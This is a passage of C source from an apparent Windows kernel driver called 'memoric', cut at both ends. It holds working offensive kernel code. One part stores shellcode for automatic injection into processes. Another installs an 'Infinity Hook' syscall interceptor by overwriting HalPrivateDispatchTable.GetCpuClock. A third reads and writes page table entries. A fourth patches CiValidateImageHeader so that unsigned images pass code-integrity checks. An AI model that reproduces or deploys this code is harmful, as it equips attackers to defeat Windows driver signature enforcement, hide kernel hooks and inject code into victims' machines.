    autoinject_query:
    {
        if (OutputBufferLength < sizeof(MEMORIC_AUTO_INJECT_RESPONSE))
            return STATUS_BUFFER_TOO_SMALL;

        PMEMORIC_AUTO_INJECT_RESPONSE resp = (PMEMORIC_AUTO_INJECT_RESPONSE)SystemBuffer;
        RtlZeroMemory(resp, sizeof(MEMORIC_AUTO_INJECT_RESPONSE));
        resp->Enabled = g_AutoInjectEnabled;
        resp->Flags = g_AutoInjectFlags;
        resp->ProcessesInjected = g_AutoInjectCount;
        resp->ProcessesFailed = g_AutoInjectFailed;
        resp->ProcessesSkipped = g_AutoInjectSkipped;
        RtlCopyMemory(resp->ProcessFilter, g_AutoInjectFilter, sizeof(g_AutoInjectFilter));

        *BytesReturned = sizeof(MEMORIC_AUTO_INJECT_RESPONSE);
        return STATUS_SUCCESS;
    }

    case MEMORIC_AUTOINJECT_SET_PAYLOAD:
    {
        /*
         * Payload data follows the request header in the system buffer.
         * Layout: [MEMORIC_AUTO_INJECT_REQUEST][shellcode bytes...]
         * MaxPayloadSize = size of shellcode data
         */
        ULONG payloadSize = req->MaxPayloadSize;
        ULONG totalNeeded = sizeof(MEMORIC_AUTO_INJECT_REQUEST) + payloadSize;

        if (payloadSize == 0 || payloadSize > 1024 * 1024) { /* 1MB max */
            DbgPrint("[memoric] AutoInject: Invalid payload size %u\n", payloadSize);
            return STATUS_INVALID_PARAMETER;
        }
        if (InputBufferLength < totalNeeded) {
            DbgPrint("[memoric] AutoInject: Buffer too small for payload (%u < %u)\n",
                     InputBufferLength, totalNeeded);
            return STATUS_BUFFER_TOO_SMALL;
        }

        /* Free existing payload if any */
        if (g_AutoInjectPayload) {
            ExFreePoolWithTag(g_AutoInjectPayload, MEMORIC_POOL_TAG);
            g_AutoInjectPayload = NULL;
            g_AutoInjectPayloadSize = 0;
        }

        /* Allocate and copy new payload */
        g_AutoInjectPayload = ExAllocatePool2(POOL_FLAG_NON_PAGED, payloadSize, MEMORIC_POOL_TAG);
        if (!g_AutoInjectPayload) {
            return STATUS_INSUFFICIENT_RESOURCES;
        }

        PUCHAR payloadSrc = (PUCHAR)SystemBuffer + sizeof(MEMORIC_AUTO_INJECT_REQUEST);
        RtlCopyMemory(g_AutoInjectPayload, payloadSrc, payloadSize);
        g_AutoInjectPayloadSize = payloadSize;

        DbgPrint("[memoric] AutoInject: Payload set, %u bytes\n", payloadSize);
        goto autoinject_query;
    }

    default:
        return STATUS_INVALID_PARAMETER;
    }
}

/* ================================================================
 * Infinity Hook — syscall interception via ETW tracing
 *
 * Uses HalPrivateDispatchTable.GetCpuClock to intercept every
 * syscall that goes through the ETW tracing path.
 * ================================================================ */

static ULONG g_InfinityHookEnabled = 0;
static ULONG g_InfinityHookSyscall = 0;
static ULONG g_InfinityHookCount = 0;
static ULONG64 g_OrigGetCpuClock = 0;
static ULONG64 g_GetCpuClockAddr = 0;

/*
 * InfinityHookHandler — replacement for HalPrivateDispatchTable.GetCpuClock
 *
 * Called on every syscall entry/exit via the ETW tracing path.
 * We inspect KTHREAD.SystemCallNumber to identify target syscalls.
 * Must be IRQL-safe (can be called at DISPATCH_LEVEL).
 *
 * KTHREAD.SystemCallNumber offset is discovered dynamically by scanning
 * the current thread during IOCTL dispatch (when we know the thread is
 * inside a system call and SystemCallNumber is populated).
 *
 * Reference: everdox/InfinityHook, hfiref0x/KDU
 */
static ULONG g_KthreadSyscallNumOffset = 0;

/*
 * DiscoverKthreadSyscallOffset — called from IOCTL context.
 *
 * At this point, the current thread is inside the NtDeviceIoControlFile
 * syscall, so KTHREAD.SystemCallNumber should be set to a valid syscall
 * number (non-zero, < 0x2000). We scan candidate offsets in KTHREAD to
 * find the field.
 */
static BOOLEAN DiscoverKthreadSyscallOffset(void)
{
    PKTHREAD currentThread = KeGetCurrentThread();
    ULONG offset;

    /* Candidate range: SystemCallNumber is typically between 0x60 and 0x120 */
    for (offset = 0x60; offset <= 0x120; offset += sizeof(ULONG)) {
        __try {
            ULONG val = *(PULONG)((PUCHAR)currentThread + offset);
            /* NtDeviceIoControlFile syscall number varies by build but is
             * always a reasonable value: non-zero and well within service table range.
             * We look for a value that looks like a syscall index. */
            if (val > 0 && val < 0x2000) {
                /* Validate: the field should be exactly 4 bytes (not a pointer).
                 * Check the adjacent ULONG for a different pattern to avoid
                 * matching a pointer's low dword. */
                ULONG64 qval = *(PULONG64)((PUCHAR)currentThread + offset);
                if ((qval >> 32) == 0 || (qval >> 32) > 0xFFFF) {
                    /* Looks like a standalone ULONG, not part of a pointer.
                     * Accept only if the value is syscall-sized (max ~0x500). */
                    if (val < 0x600) {
                        /*
                         * Cross-validate: check if the SAME offset in another
                         * thread that ISN'T in a syscall has a different (typically 0)
                         * value. We use the System idle thread for this — it should
                         * have SystemCallNumber == 0.
                         */
                        PEPROCESS sysProc = NULL;
                        BOOLEAN crossValid = TRUE;

                        if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)4, &sysProc))) {
                            /* Get System process's first thread */
                            PETHREAD sysThread = NULL;
                            HANDLE sysThreadId = NULL;
                            NTSTATUS tst;

                            /* System threads typically don't have syscall numbers set */
                            if (g_ThreadListHeadOffset != 0 && g_ThreadListEntryOffset != 0) {
                                PLIST_ENTRY tHead = (PLIST_ENTRY)((PUCHAR)sysProc + g_ThreadListHeadOffset);
                                __try {
                                    if (tHead->Flink != tHead) {
                                        PETHREAD st2 = (PETHREAD)((PUCHAR)tHead->Flink - g_ThreadListEntryOffset);
                                        ULONG sv = *(PULONG)((PUCHAR)st2 + offset);
                                        /* System thread should have 0 or a very different syscall number */
                                        if (sv == val) {
                                            crossValid = FALSE; /* same value = likely not syscall field */
                                        }
                                    }
                                } __except (EXCEPTION_EXECUTE_HANDLER) { /* keep crossValid=TRUE */ }
                            }
                            ObDereferenceObject(sysProc);
                        }

                        if (crossValid) {
                            g_KthreadSyscallNumOffset = offset;
                            DbgPrint("[memoric] InfinityHook: Discovered KTHREAD.SystemCallNumber at offset 0x%X "
                                     "(value=0x%X, cross-validated)\n", offset, val);
                            return TRUE;
                        }
                    }
                }
            }
        } __except (EXCEPTION_EXECUTE_HANDLER) { continue; }
    }

    /* Discovery failed — return FALSE instead of guessing an offset */
    DbgPrint("[memoric] InfinityHook: Failed to discover KTHREAD.SystemCallNumber offset\n");
    return FALSE;
}

static ULONG64 __fastcall InfinityHookHandler(void)
{
    if (g_InfinityHookEnabled && g_InfinityHookSyscall != 0 && g_KthreadSyscallNumOffset != 0) {
        PKTHREAD currentThread = KeGetCurrentThread();
        __try {
            ULONG syscallNum = *(PULONG)((PUCHAR)currentThread + g_KthreadSyscallNumOffset);
            if (syscallNum == g_InfinityHookSyscall) {
                InterlockedIncrement((PLONG)&g_InfinityHookCount);
            }
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            /* Silently continue — we don't want to crash on bad offset */
        }
    }

    /* Call original GetCpuClock */
    if (g_OrigGetCpuClock != 0) {
        typedef ULONG64 (__fastcall *PFN_GetCpuClock)(void);
        return ((PFN_GetCpuClock)(ULONG_PTR)g_OrigGetCpuClock)();
    }

    /* Fallback: return KeQueryPerformanceCounter value */
    {
        LARGE_INTEGER perf;
        perf = KeQueryPerformanceCounter(NULL);
        return (ULONG64)perf.QuadPart;
    }
}

static NTSTATUS HandleInfinityHook(
    PVOID SystemBuffer,
    ULONG InputBufferLength,
    ULONG OutputBufferLength,
    PULONG BytesReturned)
{
    PMEMORIC_INFINITY_HOOK_REQUEST req;

    if (InputBufferLength < sizeof(MEMORIC_INFINITY_HOOK_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;

    req = (PMEMORIC_INFINITY_HOOK_REQUEST)SystemBuffer;

    switch (req->Action) {
    case MEMORIC_INFHOOK_ENABLE:
    {
        /*
         * Infinity Hook — intercept syscalls via HalPrivateDispatchTable.GetCpuClock
         *
         * Reference: everdox/InfinityHook (GitHub)
         * The Windows ETW tracing path calls HalCollectPmcCounter → GetCpuClock
         * on every syscall entry/exit when the system perfmon group is enabled.
         * By replacing the GetCpuClock pointer, we intercept the call and can
         * inspect KTHREAD.SystemCallNumber to identify which syscall was made.
         *
         * On Windows 10 1803+, GetCpuClock offset is 0x148 in HPDT.
         * On Windows 11 22H2+, it may differ — we validate the pointer first.
         */

        /* HalPrivateDispatchTable is exported by ntoskrnl */
        UNICODE_STRING hpdtName;
        RtlInitUnicodeString(&hpdtName, L"HalPrivateDispatchTable");
        PVOID hpdt = MmGetSystemRoutineAddress(&hpdtName);

        if (hpdt == NULL) {
            DbgPrint("[memoric] HalPrivateDispatchTable not found\n");
            return STATUS_NOT_FOUND;
        }

        /* Scan for GetCpuClock entry: look for a function pointer that
           resolves to hal.dll or ntoskrnl code. Try known offsets. */
        ULONG getCpuClockOffset = 0;
        {
            static const ULONG candidateOffsets[] = { 0x148, 0x150, 0x158, 0x140 };
            ULONG ci;
            for (ci = 0; ci < sizeof(candidateOffsets)/sizeof(candidateOffsets[0]); ci++) {
                __try {
                    PULONG64 candidate = (PULONG64)((PUCHAR)hpdt + candidateOffsets[ci]);
                    ULONG64 val = *candidate;
                    /* Validate: must be a kernel-mode address */
                    if (val > 0xFFFF800000000000ULL && val < 0xFFFFFFFFFFFFFFF0ULL) {
                        getCpuClockOffset = candidateOffsets[ci];
                        break;
                    }
                } __except (EXCEPTION_EXECUTE_HANDLER) {
                    continue;
                }
            }
        }

        if (getCpuClockOffset == 0) {
            DbgPrint("[memoric] Could not locate GetCpuClock in HPDT\n");
            return STATUS_NOT_FOUND;
        }

        /* Discover KTHREAD.SystemCallNumber offset if not yet known */
        if (g_KthreadSyscallNumOffset == 0) {
            if (!DiscoverKthreadSyscallOffset()) {
                DbgPrint("[memoric] InfinityHook: Cannot discover KTHREAD.SystemCallNumber — aborting\n");
                return STATUS_NOT_SUPPORTED;
            }
        }

        PULONG64 getCpuClockPtr = (PULONG64)((PUCHAR)hpdt + getCpuClockOffset);

        __try {
            g_OrigGetCpuClock = *getCpuClockPtr;
            g_GetCpuClockAddr = (ULONG64)getCpuClockPtr;
            g_InfinityHookSyscall = req->SyscallNumber;

            /*
             * Install hook: Replace GetCpuClock pointer with our handler.
             * Our handler (InfinityHookHandler) inspects KTHREAD.SystemCallNumber
             * and increments the counter when the target syscall is seen.
             *
             * The handler must be in non-paged memory (our .text is non-paged).
             * Use SafeKernelWrite since the dispatch table may be in read-only memory.
             */
            ULONG64 hookAddr = (ULONG64)(ULONG_PTR)InfinityHookHandler;
            NTSTATUS hookStatus = SafeKernelWrite(getCpuClockPtr, &hookAddr, sizeof(ULONG64));
            if (!NT_SUCCESS(hookStatus)) {
                DbgPrint("[memoric] SafeKernelWrite failed installing infinity hook: 0x%08X\n", hookStatus);
                return hookStatus;
            }

            g_InfinityHookEnabled = 1;
            g_InfinityHookCount = 0;

            DbgPrint("[memoric] InfinityHook installed: HPDT+0x%X, orig=0x%llX, hook=0x%llX, syscall=%lu\n",
                     getCpuClockOffset, g_OrigGetCpuClock, hookAddr, req->SyscallNumber);
        } __except(EXCEPTION_EXECUTE_HANDLER) {
            DbgPrint("[memoric] Exception setting up infinity hook: 0x%08X\n", GetExceptionCode());
            return STATUS_UNSUCCESSFUL;
        }

        goto infhook_query;
    }

    case MEMORIC_INFHOOK_DISABLE:
    {
        if (g_InfinityHookEnabled && g_GetCpuClockAddr != 0 && g_OrigGetCpuClock != 0) {
            /* Restore original GetCpuClock using SafeKernelWrite (Hyper-V safe) */
            NTSTATUS restoreStatus = SafeKernelWrite(
                (PVOID)g_GetCpuClockAddr, &g_OrigGetCpuClock, sizeof(ULONG64));
            if (!NT_SUCCESS(restoreStatus)) {
                DbgPrint("[memoric] SafeKernelWrite failed restoring GetCpuClock: 0x%08X\n", restoreStatus);
                return restoreStatus;
            }
        }

        g_InfinityHookEnabled = 0;
        DbgPrint("[memoric] InfinityHook disabled\n");
        goto infhook_query;
    }

    case MEMORIC_INFHOOK_QUERY:
    infhook_query:
    {
        if (OutputBufferLength < sizeof(MEMORIC_INFINITY_HOOK_RESPONSE))
            return STATUS_BUFFER_TOO_SMALL;

        PMEMORIC_INFINITY_HOOK_RESPONSE resp = (PMEMORIC_INFINITY_HOOK_RESPONSE)SystemBuffer;
        RtlZeroMemory(resp, sizeof(MEMORIC_INFINITY_HOOK_RESPONSE));
        resp->Enabled = g_InfinityHookEnabled;
        resp->SyscallNumber = g_InfinityHookSyscall;
        resp->InterceptionCount = g_InfinityHookCount;
        resp->GetCpuClockAddr = g_GetCpuClockAddr;
        resp->OriginalHandler = g_OrigGetCpuClock;

        *BytesReturned = sizeof(MEMORIC_INFINITY_HOOK_RESPONSE);
        return STATUS_SUCCESS;
    }

    default:
        return STATUS_INVALID_PARAMETER;
    }
}

/* ================================================================
 * IRP Dispatch
 * ================================================================ */

NTSTATUS MemoricCreate(
    PDEVICE_OBJECT DeviceObject,
    PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    /* Reject new opens if driver is unloading */
    if (g_Unloading) {
        Irp->IoStatus.Status = STATUS_DELETE_PENDING;
        Irp->IoStatus.Information = 0;
        IoCompleteRequest(Irp, IO_NO_INCREMENT);
        return STATUS_DELETE_PENDING;
    }

    /* Verify caller has SeDebugPrivilege (requires admin elevation) */
    if (!IsCallerPrivileged()) {
        DbgPrint("[memoric] Access denied: caller lacks SeDebugPrivilege (PID=%lu)\n",
                 (ULONG)(ULONG_PTR)PsGetCurrentProcessId());
        Irp->IoStatus.Status = STATUS_ACCESS_DENIED;
        Irp->IoStatus.Information = 0;
        IoCompleteRequest(Irp, IO_NO_INCREMENT);
        return STATUS_ACCESS_DENIED;
    }

    InterlockedIncrement(&g_OpenHandles);
    DbgPrint("[memoric] Handle opened (count=%ld, PID=%lu)\n",
             g_OpenHandles, (ULONG)(ULONG_PTR)PsGetCurrentProcessId());

    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

NTSTATUS MemoricCleanup(
    PDEVICE_OBJECT DeviceObject,
    PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    /* IRP_MJ_CLEANUP: last usermode handle to this file object is being closed */
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

NTSTATUS MemoricClose(
    PDEVICE_OBJECT DeviceObject,
    PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    InterlockedDecrement(&g_OpenHandles);
    DbgPrint("[memoric] Handle closed (count=%ld)\n", g_OpenHandles);

    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

/* ================================================================
 * Handle GET_MODULE_BASE — return kernel module base from kernel-mode
 * ZwQuerySystemInformation(SystemModuleInformation).
 * On Windows 26220+ user-mode receives zeroed addresses; kernel-mode
 * still returns real values.
 * ================================================================ */
static NTSTATUS HandleGetModuleBase(
    PVOID systemBuffer,
    ULONG inputLength,
    ULONG outputLength,
    PULONG bytesReturned)
{
    PMEMORIC_MODULE_BASE_REQUEST req;
    MEMORIC_MODULE_BASE_RESPONSE resp;
    ULONG infoSize = 0;
    PVOID buf = NULL;
    NTSTATUS st;

    UNREFERENCED_PARAMETER(bytesReturned);

    if (inputLength < sizeof(MEMORIC_MODULE_BASE_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (outputLength < sizeof(MEMORIC_MODULE_BASE_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;

    req = (PMEMORIC_MODULE_BASE_REQUEST)systemBuffer;
    req->ModuleName[255] = '\0';

    RtlZeroMemory(&resp, sizeof(resp));

    /* Query required buffer size */
    st = ZwQuerySystemInformation(11, NULL, 0, &infoSize);
    if (infoSize == 0 || infoSize > 4 * 1024 * 1024) {
        DbgPrint("[memoric] GetModuleBase: ZwQuerySystemInformation size query failed (size=%lu)\n", infoSize);
        goto done;
    }

    buf = ExAllocatePoolWithTag(NonPagedPool, infoSize, MEMORIC_POOL_TAG);
    if (!buf) {
        DbgPrint("[memoric] GetModuleBase: pool alloc failed (%lu bytes)\n", infoSize);
        goto done;
    }

    st = ZwQuerySystemInformation(11, buf, infoSize, NULL);
    if (!NT_SUCCESS(st)) {
        DbgPrint("[memoric] GetModuleBase: ZwQuerySystemInformation failed: 0x%08X\n", st);
        goto done;
    }

    {
        PRTL_PROCESS_MODULES mods = (PRTL_PROCESS_MODULES)buf;
        ULONG i;
        for (i = 0; i < mods->NumberOfModules; i++) {
            PCHAR modName = (PCHAR)(mods->Modules[i].FullPathName +
                                     mods->Modules[i].OffsetToFileName);
            if (_stricmp(modName, req->ModuleName) == 0) {
                resp.ModuleBase = (ULONG64)(ULONG_PTR)mods->Modules[i].ImageBase;
                resp.ModuleSize = mods->Modules[i].ImageSize;
                resp.Found = 1;
                break;
            }
        }
    }

done:
    if (buf)
        ExFreePoolWithTag(buf, MEMORIC_POOL_TAG);

    RtlCopyMemory(systemBuffer, &resp, sizeof(resp));
    *bytesReturned = sizeof(MEMORIC_MODULE_BASE_RESPONSE);

    DbgPrint("[memoric] GetModuleBase: \"%s\" -> base=0x%llX size=0x%X found=%lu\n",
             req->ModuleName, resp.ModuleBase, resp.ModuleSize, resp.Found);

    return STATUS_SUCCESS;
}

/* ================================================================
 * PTE Read/Write — Discover MiGetPteAddress base and manipulate PTEs.
 *
 * Uses pattern scan of ntoskrnl .text for the MiGetPteAddress body:
 *   shr rcx, 9
 *   mov rax, 0x7FFFFFFFF8
 *   and rcx, rax
 *   mov rax, PTE_BASE          <-- extract this (8 bytes at offset 19)
 *   add rax, rcx
 *   ret
 *
 * PTE address for a given VA: ((VA >> 9) & 0x7FFFFFFFF8) + PTE_BASE
 * ================================================================ */

static ULONG64 g_PteBase = 0;         /* Cached MiGetPteAddress PTE base */
static BOOLEAN g_PteBaseResolved = FALSE;

/* Find ntoskrnl base and size via ZwQuerySystemInformation */
static NTSTATUS FindKernelModule(
    const char* moduleName,
    PVOID* outBase,
    PULONG outSize)
{
    ULONG infoSize = 0;
    PVOID buf = NULL;
    NTSTATUS st;

    *outBase = NULL;
    if (outSize) *outSize = 0;

    st = ZwQuerySystemInformation(11, NULL, 0, &infoSize);
    if (infoSize == 0 || infoSize > 8 * 1024 * 1024)
        return STATUS_UNSUCCESSFUL;

    buf = ExAllocatePoolWithTag(NonPagedPool, infoSize, MEMORIC_POOL_TAG);
    if (!buf) return STATUS_INSUFFICIENT_RESOURCES;

    st = ZwQuerySystemInformation(11, buf, infoSize, NULL);
    if (!NT_SUCCESS(st)) {
        ExFreePoolWithTag(buf, MEMORIC_POOL_TAG);
        return st;
    }

    {
        PRTL_PROCESS_MODULES mods = (PRTL_PROCESS_MODULES)buf;
        ULONG i;
        for (i = 0; i < mods->NumberOfModules; i++) {
            PCHAR modName = (PCHAR)(mods->Modules[i].FullPathName +
                                     mods->Modules[i].OffsetToFileName);
            if (_stricmp(modName, moduleName) == 0) {
                *outBase = mods->Modules[i].ImageBase;
                if (outSize) *outSize = mods->Modules[i].ImageSize;
                break;
            }
        }
    }

    ExFreePoolWithTag(buf, MEMORIC_POOL_TAG);
    return (*outBase != NULL) ? STATUS_SUCCESS : STATUS_NOT_FOUND;
}

/* Resolve PTE base by scanning ntoskrnl .text for MiGetPteAddress pattern */
static NTSTATUS ResolvePteBase(void)
{
    PVOID ntBase = NULL;
    ULONG ntSize = 0;
    PIMAGE_NT_HEADERS64 ntHdr;
    PIMAGE_SECTION_HEADER sec;
    ULONG i, j;
    NTSTATUS st;

    /*
     * MiGetPteAddress pattern (30 bytes):
     * 48 C1 E9 09              shr rcx, 9
     * 48 B8 F8 FF FF FF 7F 00 00 00   mov rax, 0x7FFFFFFFF8
     * 48 23 C8                 and rcx, rax
     * 48 B8 xx xx xx xx xx xx xx xx   mov rax, PTE_BASE
     * 48 03 C1                 add rax, rcx
     * C3                       ret
     */
    static const UCHAR pattern[] = {
        0x48, 0xC1, 0xE9, 0x09,
        0x48, 0xB8, 0xF8, 0xFF, 0xFF, 0xFF, 0x7F, 0x00, 0x00, 0x00,
        0x48, 0x23, 0xC8,
        0x48, 0xB8
    };
    /* PTE_BASE is at offset 19 (8 bytes) */
    #define PTE_BASE_OFFSET 19

    if (g_PteBaseResolved)
        return STATUS_SUCCESS;

    st = FindKernelModule("ntoskrnl.exe", &ntBase, &ntSize);
    if (!NT_SUCCESS(st)) {
        DbgPrint("[memoric] PTE: Cannot find ntoskrnl.exe\n");
        return st;
    }

    /* Parse PE to find .text section */
    ntHdr = RtlImageNtHeader(ntBase);
    if (!ntHdr) {
        DbgPrint("[memoric] PTE: Invalid PE header for ntoskrnl\n");
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    sec = IMAGE_FIRST_SECTION(ntHdr);
    for (i = 0; i < ntHdr->FileHeader.NumberOfSections; i++, sec++) {
        PUCHAR secStart, secEnd;
        ULONG secSize;

        /* Skip non-.text or non-PAGE sections */
        if (sec->Characteristics & IMAGE_SCN_MEM_DISCARDABLE)
            continue;
        if (!(sec->Characteristics & IMAGE_SCN_MEM_EXECUTE))
            continue;

        secStart = (PUCHAR)ntBase + sec->VirtualAddress;
        secSize = sec->Misc.VirtualSize;
        secEnd = secStart + secSize;

        /* Validate accessible range */
        if ((ULONG_PTR)secStart < 0xFFFF000000000000ULL)
            continue;

        for (j = 0; j + sizeof(pattern) + 8 + 4 <= secSize; j++) {
            __try {
                if (RtlCompareMemory(secStart + j, pattern, sizeof(pattern)) == sizeof(pattern)) {
                    /* Found pattern — extract PTE_BASE from offset 19 */
                    ULONG64 pteBase = *(PULONG64)(secStart + j + PTE_BASE_OFFSET);
                    /* Validate: PTE base should be in kernel address range */
                    if (pteBase > 0xFFFF000000000000ULL) {
                        g_PteBase = pteBase;
                        g_PteBaseResolved = TRUE;
                        DbgPrint("[memoric] PTE: MiGetPteAddress found at %p, PTE base=0x%llX\n",
                                 secStart + j, pteBase);
                        return STATUS_SUCCESS;
                    }
                }
            } __except (EXCEPTION_EXECUTE_HANDLER) {
                continue;
            }
        }
    }

    DbgPrint("[memoric] PTE: MiGetPteAddress pattern not found\n");
    return STATUS_NOT_FOUND;
}

/* Compute PTE virtual address for a given VA */
static ULONG64 GetPteAddress(ULONG64 va)
{
    return ((va >> 9) & 0x7FFFFFFFF8ULL) + g_PteBase;
}

static NTSTATUS HandlePteRW(
    PVOID systemBuffer,
    ULONG inputLength,
    ULONG outputLength,
    PULONG bytesReturned)
{
    MEMORIC_PTE_REQUEST reqCopy;
    PMEMORIC_PTE_RESPONSE resp;
    NTSTATUS st;
    ULONG64 pteAddr, pteValue;

    if (inputLength < sizeof(MEMORIC_PTE_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (outputLength < sizeof(MEMORIC_PTE_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;

    RtlCopyMemory(&reqCopy, systemBuffer, sizeof(MEMORIC_PTE_REQUEST));
    resp = (PMEMORIC_PTE_RESPONSE)systemBuffer;
    RtlZeroMemory(resp, sizeof(MEMORIC_PTE_RESPONSE));

    /* Ensure PTE base is resolved */
    st = ResolvePteBase();
    if (!NT_SUCCESS(st)) {
        DbgPrint("[memoric] PTE: Failed to resolve PTE base: 0x%08X\n", st);
        *bytesReturned = sizeof(MEMORIC_PTE_RESPONSE);
        return STATUS_SUCCESS; /* Return success with resp->Success=0 */
    }

    pteAddr = GetPteAddress(reqCopy.VirtualAddress);

    __try {
        pteValue = *(volatile ULONG64*)pteAddr;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        DbgPrint("[memoric] PTE: Cannot read PTE at 0x%llX for VA 0x%llX\n",
                 pteAddr, reqCopy.VirtualAddress);
        *bytesReturned = sizeof(MEMORIC_PTE_RESPONSE);
        return STATUS_SUCCESS;
    }

    resp->VirtualAddress = reqCopy.VirtualAddress;
    resp->PteAddress = pteAddr;
    resp->PteValue = pteValue;
    resp->OriginalPteValue = pteValue;
    resp->PteBase = g_PteBase;

    switch (reqCopy.Action) {
    case MEMORIC_PTE_READ:
        resp->Success = 1;
        break;

    case MEMORIC_PTE_WRITE:
        __try {
            *(volatile ULONG64*)pteAddr = reqCopy.NewPteValue;
            __invlpg((PVOID)reqCopy.VirtualAddress);
            resp->PteValue = reqCopy.NewPteValue;
            resp->Success = 1;
            DbgPrint("[memoric] PTE: Wrote PTE for VA 0x%llX: 0x%llX -> 0x%llX\n",
                     reqCopy.VirtualAddress, pteValue, reqCopy.NewPteValue);
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            DbgPrint("[memoric] PTE: Write failed at PTE 0x%llX\n", pteAddr);
        }
        break;

    case MEMORIC_PTE_MAKE_WRITABLE:
        __try {
            ULONG64 newPte = pteValue | 2ULL; /* Set bit 1: Read/Write */
            *(volatile ULONG64*)pteAddr = newPte;
            __invlpg((PVOID)reqCopy.VirtualAddress);
            resp->PteValue = newPte;
            resp->Success = 1;
            DbgPrint("[memoric] PTE: Made VA 0x%llX writable (PTE: 0x%llX -> 0x%llX)\n",
                     reqCopy.VirtualAddress, pteValue, newPte);
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            DbgPrint("[memoric] PTE: Make-writable failed\n");
        }
        break;

    case MEMORIC_PTE_RESTORE:
        if (reqCopy.NewPteValue != 0) {
            __try {
                *(volatile ULONG64*)pteAddr = reqCopy.NewPteValue;
                __invlpg((PVOID)reqCopy.VirtualAddress);
                resp->PteValue = reqCopy.NewPteValue;
                resp->Success = 1;
                DbgPrint("[memoric] PTE: Restored PTE for VA 0x%llX to 0x%llX\n",
                         reqCopy.VirtualAddress, reqCopy.NewPteValue);
            } __except (EXCEPTION_EXECUTE_HANDLER) {
                DbgPrint("[memoric] PTE: Restore failed\n");
            }
        }
        break;

    default:
        DbgPrint("[memoric] PTE: Unknown action %lu\n", reqCopy.Action);
        break;
    }

    *bytesReturned = sizeof(MEMORIC_PTE_RESPONSE);
    return STATUS_SUCCESS;
}

/* ================================================================
 * CI Function Patch — Patch CiValidateImageHeader prologue directly
 * in CI.dll kernel module. Uses PTE manipulation to make the code
 * page writable (Hyper-V safe, no CR0.WP needed).
 *
 * Patch bytes: 33 C0 C3 90 (xor eax,eax; ret; nop)
 * This makes CiValidateImageHeader return STATUS_SUCCESS (0)
 * for all images regardless of signature.
 * ================================================================ */

static UCHAR g_CiFuncOrigBytes[16] = { 0 };
static ULONG64 g_CiFuncAddr = 0;
static ULONG64 g_CiFuncOrigPte = 0;
static BOOLEAN g_CiFuncPatched = FALSE;
static BOOLEAN g_CiFuncSaved = FALSE;

static NTSTATUS HandleCiFuncPatch(
    PVOID systemBuffer,
    ULONG inputLength,
    ULONG outputLength,
    PULONG bytesReturned)
{
    MEMORIC_CI_FUNC_PATCH_REQUEST reqCopy;
    PMEMORIC_CI_FUNC_PATCH_RESPONSE resp;
    UNICODE_STRING funcName;
    PVOID ciAddr;
    NTSTATUS st;

    if (inputLength < sizeof(MEMORIC_CI_FUNC_PATCH_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (outputLength < sizeof(MEMORIC_CI_FUNC_PATCH_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;

    RtlCopyMemory(&reqCopy, systemBuffer, sizeof(MEMORIC_CI_FUNC_PATCH_REQUEST));
    resp = (PMEMORIC_CI_FUNC_PATCH_RESPONSE)systemBuffer;
    RtlZeroMemory(resp, sizeof(MEMORIC_CI_FUNC_PATCH_RESPONSE));

    /* Find CiValidateImageHeader */
    RtlInitUnicodeString(&funcName, L"CiValidateImageHeader");
    ciAddr = MmGetSystemRoutineAddress(&funcName);
    if (!ciAddr) {
        DbgPrint("[memoric] CiFuncPatch: CiValidateImageHeader not found\n");
        *bytesReturned = sizeof(MEMORIC_CI_FUNC_PATCH_RESPONSE);
        return STATUS_SUCCESS;
    }

    g_CiFuncAddr = (ULONG64)(ULONG_PTR)ciAddr;
    resp->CiValidateAddr = g_CiFuncAddr;

    switch (reqCopy.Action) {
    case MEMORIC_CI_FUNC_PATCH: {
        ULONG64 pteAddr, pteValue;
        /* xor eax,eax; ret; nop — returns STATUS_SUCCESS */
        UCHAR patch[] = { 0x33, 0xC0, 0xC3, 0x90 };

        /* First resolve PTE base */
        st = ResolvePteBase();
        if (!NT_SUCCESS(st)) {
            DbgPrint("[memoric] CiFuncPatch: PTE base resolution failed\n");
            break;
        }

        /* Save original bytes */
        if (!g_CiFuncSaved) {
            __try {
                RtlCopyMemory(g_CiFuncOrigBytes, ciAddr, sizeof(g_CiFuncOrigBytes));
                g_CiFuncSaved = TRUE;
            } __except (EXCEPTION_EXECUTE_HANDLER) {
                DbgPrint("[memoric] CiFuncPatch: Cannot read original bytes\n");
                break;
            }
        }

        /* Make code page writable via PTE */
        pteAddr = GetPteAddress((ULONG64)(ULONG_PTR)ciAddr);
        __try {
            pteValue = *(volatile ULONG64*)pteAddr;
            g_CiFuncOrigPte = pteValue;

            /* Set writable bit */
            *(volatile ULONG64*)pteAddr = pteValue | 2ULL;
            __invlpg(ciAddr);
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            DbgPrint("[memoric] CiFuncPatch: Cannot modify PTE\n");
            break;
        }

        /* Patch the function prologue */
        __try {
            RtlCopyMemory(ciAddr, patch, sizeof(patch));
            g_CiFuncPatched = TRUE;
            resp->Success = 1;
            resp->Patched = 1;
            DbgPrint("[memoric] CiFuncPatch: CiValidateImageHeader patched at %p\n", ciAddr);
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            DbgPrint("[memoric] CiFuncPatch: Patch write failed\n");
        }

